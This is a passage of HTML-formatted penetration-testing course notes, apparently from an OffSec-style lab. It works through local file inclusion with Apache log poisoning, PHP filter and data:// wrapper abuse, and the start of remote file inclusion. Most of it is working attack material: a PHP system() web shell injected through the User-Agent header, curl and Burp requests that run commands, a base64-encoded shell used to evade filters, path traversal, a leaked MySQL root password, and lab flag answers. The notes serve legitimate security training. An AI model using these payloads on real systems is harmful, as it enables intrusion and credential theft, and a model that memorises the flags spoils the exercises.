+        This script serves as backup for the old admin.php. The new website is still under development.. As long as it is not finished and deployed, we keep this hereIf you need this backup script just shoot me an email. The password for the backups is always OS{922a8fe91bf3c9e1718791cac49bc89a}
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &amp;quot;Mountain Desserts&amp;quot; web application now runs on VM #3 at &lt;a href=&quot;http://192.168.50.193/meteor/&quot;&gt;http://192.168.50.193/meteor/&lt;/a&gt; (The third octet of the IP address in the URL needs to be adjusted). Use the LFI vulnerability in combination with Log Poisoning to execute the dir command. Poison the access.log log in the XAMPP C:\xampp\apache\logs log directory . Find the flag in one of the files from the dir command output.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Target Xamp stack Win server.&lt;ul&gt;
+&lt;li&gt;Log path &amp;#39;C:\xampp\apache\logs\access.log&amp;#39;.&lt;/li&gt;
+&lt;li&gt;Request sent to Burp.&lt;ul&gt;
+&lt;li&gt;Performed DT shown below, UA string written to Apache access log.&lt;/li&gt;
+&lt;li&gt;Prepare to inject PHP on-liner &lt;code&gt;&amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&lt;/code&gt; in UA header.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;
+### Check access.log 
+
+┌──(kali㉿kali)-[~]
+└─$ urlencode &amp;#39;C:\xampp\apache\logs\access.log&amp;#39;
+C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log
+
+GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+### After log poisoning, check with &amp;#39;dir&amp;#39;
+
+GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log&amp;amp;cmd=dir HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+192.168.45.198 - - [27/Aug/2023:11:07:10 -0700] &amp;quot;GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log HTTP/1.1&amp;quot; 200 27273 &amp;quot;http://mountaindesserts.com/meteor/&amp;quot; &amp;quot; Volume in drive C has no label.
+ Volume Serial Number is 84F6-D600
+
+ Directory of C:\xampp\htdocs\meteor
+
+05/03/2022  11:08 AM    &amp;lt;DIR&amp;gt;          .
+05/03/2022  10:55 AM    &amp;lt;DIR&amp;gt;          ..
+05/03/2022  10:55 AM               453 ABOUT THIS TEMPLATE.txt
+05/03/2022  10:55 AM               621 admin.php
+05/03/2022  10:55 AM    &amp;lt;DIR&amp;gt;          css
+05/03/2022  10:55 AM               265 docker-compose.yml
+05/03/2022  10:55 AM               411 Dockerfile
+05/03/2022  10:55 AM    &amp;lt;DIR&amp;gt;          fonts
+08/27/2023  10:41 AM                38 hopefullynobodyfindsthisfilebecauseitssupersecret.txt
+05/03/2022  10:55 AM    &amp;lt;DIR&amp;gt;          img
+05/03/2022  10:55 AM             7,129 index.php
+05/03/2022  10:55 AM    &amp;lt;DIR&amp;gt;          js
+05/03/2022  10:55 AM            72,940 php.ini
+05/03/2022  10:55 AM                61 start.sh
+               8 File(s)         81,918 bytes
+               6 Dir(s)   5,956,108,288 bytes free
+               6 Dir(s)   5,956,108,288 bytes free text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&amp;quot;
+192.168.45.198 - - [27/Aug/2023:11:07:28 -0700] &amp;quot;GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log&amp;amp;cmd=ps HTTP/1.1&amp;quot; 200 27589 &amp;quot;http://mountaindesserts.com/meteor/&amp;quot; &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&amp;quot;
+
+    &amp;lt;script&amp;gt;
+...
+
+### view secret, kill confirmed
+
+GET /meteor/index.php?page=hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+&amp;lt;/a&amp;gt;
+OS{14b069b2a4b837e64c31d95d1da76910}
+
+    &amp;lt;script&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;PHP Wrappers&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;PHP wrappers enhance the lang capability.&lt;/li&gt;
+&lt;li&gt;Can be used to represent local or remote fs.&lt;/li&gt;
+&lt;li&gt;Can use wrappers to bypass filters or obtain code exec.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.php.net/manual/en/wrappers.php&quot;&gt;many available&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;We will look at;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;php://filter&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Display contents of files with or without encoding, ROT13 or Base64.&lt;/li&gt;
+&lt;li&gt;Can display content of exec PHP files instead of exec them.&lt;/li&gt;
+&lt;li&gt;Provides INT on potentially sensitive info.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;data://&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Can achieve code execution.&lt;/li&gt;
+&lt;li&gt;Utilize same PHP snips as used in log poisoning.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;filter example&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Note, body is not closed!!! We can assume exec code, such as php, follows.&lt;/p&gt;
+&lt;p&gt;Include with filter.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Same result as PHP is still executing, encode to base64 string to extract.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copy string from output and decode in terminal.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ echo &amp;quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&amp;quot; | base64 -d
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;?php echo &amp;#39;&amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.&amp;#39;; ?&amp;gt;
+
+&amp;lt;?php
+$servername = &amp;quot;localhost&amp;quot;;
+$username = &amp;quot;root&amp;quot;;
+$password = &amp;quot;M00nK4keCard!2#&amp;quot;;
+
+// Create connection
+$conn = new mysqli($servername, $username, $password);
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Decoded data contains MySQL conn info!!!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;data example&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&amp;lt;?php%20echo%20system(&amp;#39;ls&amp;#39;);?&amp;gt;&amp;quot;
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PHP snip with data wrapper shows output of &lt;code&gt;ls&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When web application firewalls or other security mechanisms are in place, they may filter strings like &amp;quot;system&amp;quot; or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We&amp;#39;ll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ echo -n &amp;#39;&amp;lt;?php echo system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;#39; | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+
+kali@kali:~$ curl &amp;quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;amp;cmd=ls&amp;quot;
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+start.sh
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Listing 25 shows that we successfully achieved code execution with the base64-encoded PHP snippet. This is a handy technique that may help us bypass basic filters. However, we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the &lt;a href=&quot;https://www.php.net/manual/en/filesystem.configuration.php&quot;&gt;allow_url_include&lt;/a&gt; setting needs to be enabled.&lt;/p&gt;
+&lt;h4&gt;PHP Wrapper Exercises&lt;/h4&gt;
+&lt;p&gt;Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding to include the contents of the /var/www/html/backup.php file with Burp or curl. Copy the output, decode it, and find the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+### Test filter and base64 encode on admin.php
+
+GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+### Decode base64 encoded string, look at all the good loot!!!
+
+┌──(kali㉿kali)-[~]
+└─$ echo &amp;quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&amp;quot; | base64 -d
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;?php echo &amp;#39;&amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.&amp;#39;; ?&amp;gt;
+
+&amp;lt;?php
+$servername = &amp;quot;localhost&amp;quot;;
+$username = &amp;quot;root&amp;quot;;
+$password = &amp;quot;M00nK4keCard!2#&amp;quot;;
+
+// Create connection
+$conn = new mysqli($servername, $username, $password);
+
+// Check connection
+if ($conn-&amp;gt;connect_error) {
+  die(&amp;quot;Connection failed: &amp;quot; . $conn-&amp;gt;connect_error);
+}
+echo &amp;quot;Connected successfully&amp;quot;;
+?&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+### Go after the target file /var/www/html/backup.php
+
+GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+┌──(kali㉿kali)-[~]
+└─$ echo &amp;quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7ZDg4YjQ2NGJkYzcwNjExNTZjNjliNTAwOTQ2YzM0MmV9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo=&amp;quot; | base64 -d
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;?php echo &amp;#39;&amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.&amp;#39;; ?&amp;gt;
+
+&amp;lt;?php
+
+system(&amp;quot;sudo rsync -avzR /var/www/html/index.php /mnt/external/&amp;quot;);
+// Since it is a PHP file visitors cannot see this comment. We need to extend this script that it backups the whole system but now as a PoC it only backups index.php
+//@All: When you run the backup script you need to enter the password OS{d88b464bdc7061156c69b500946c342e}.
+
+?&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+
+### If exp path had failed and we needed url encoding
+
+┌──(kali㉿kali)-[~]
+└─$ urlencode &amp;#39;../../../../../../../../var/www/html/backup.php&amp;#39;
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fbackup.php
+
+
+GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fbackup.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ echo &amp;quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7ZDg4YjQ2NGJkYzcwNjExNTZjNjliNTAwOTQ2YzM0MmV9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo=&amp;quot; | base64 -d
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
+    &amp;lt;title&amp;gt;Maintenance&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+        &amp;lt;?php echo &amp;#39;&amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.&amp;#39;; ?&amp;gt;
+
+&amp;lt;?php
+
+system(&amp;quot;sudo rsync -avzR /var/www/html/index.php /mnt/external/&amp;quot;);
+// Since it is a PHP file visitors cannot see this comment. We need to extend this script that it backups the whole system but now as a PoC it only backups index.php
+//@All: When you run the backup script you need to enter the password OS{d88b464bdc7061156c69b500946c342e}.
+
+?&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;
+GET /meteor/index.php?page=data://text/plain,&amp;lt;?php%20echo%20system(&amp;#39;uname%20-a&amp;#39;);?&amp;gt; HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
+Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
+    &amp;lt;script&amp;gt;window.jQuery || document.write(&amp;#39;&amp;lt;script src=&amp;quot;js/vendor/jquery-1.11.2.min.js&amp;quot;&amp;gt;&amp;lt;\/script&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt;
+...
+
+### Kernel version
+
+5.4.0-132-generic
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Remote File Inclusion (RFI)&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow_url_include option needs to be enabled to leverage RFI, just as with the data:// wrapper from the previous section.&lt;ul&gt;
+&lt;li&gt;Disabled by default.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Allow us to include remote files over HTTP or SMB.&lt;ul&gt;
+&lt;li&gt;Also exec in context of web app.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Discover using same techniques as DT and LFI.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;WebShells&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
